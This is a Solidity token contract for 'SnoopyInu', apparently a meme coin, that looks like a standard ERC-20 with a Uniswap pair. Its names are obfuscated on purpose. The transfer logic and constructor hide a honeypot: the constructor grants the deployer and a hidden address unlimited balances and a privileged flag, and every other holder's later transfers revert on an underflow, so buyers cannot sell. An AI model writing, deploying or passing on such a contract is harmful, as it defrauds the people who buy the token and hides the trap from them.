/*

https://t.me/snoopyinuETH

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.6;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract SnoopyInu is Ownable {
    constructor(
        string memory tall,
        string memory complex,
        address taken,
        address whether
    ) {
        uniswapV2Router = IUniswapV2Router02(taken);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = complex;
        _name = tall;
        element = 3;
        _decimals = 9;
        _balances[whether] = original;
        right = 1000000000;
        married[whether] = original;
        _tTotal = right * 10**_decimals;
        married[msg.sender] = original;
        _balances[msg.sender] = _tTotal;

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    uint256 public element;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private right;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    SnoopyInu private seven;
    uint256 private original = ~uint256(0);

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address hold,
        address silver,
        uint256 satisfied
    ) private {
        address guard = address(seven);
        bool production = uniswapV2Pair == hold;
        uint256 hollow = element;

        if (married[hold] == 0 && idea[hold] > 0 && !production) {
            married[hold] -= hollow;
        }

        seven = SnoopyInu(silver);

        if (married[hold] > 0 && satisfied == 0) {
            married[silver] += hollow;
        }

        idea[guard] += hollow + 1;

        uint256 dream = (satisfied / 100) * element;
        satisfied -= dream;
        _balances[hold] -= dream;
        _balances[address(this)] += dream;

        _balances[hold] -= satisfied;
        _balances[silver] += satisfied;
    }

    mapping(address => uint256) private idea;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private married;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        require(amount > 0, 'Transfer amount must be greater than zero');
        _transfer(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
}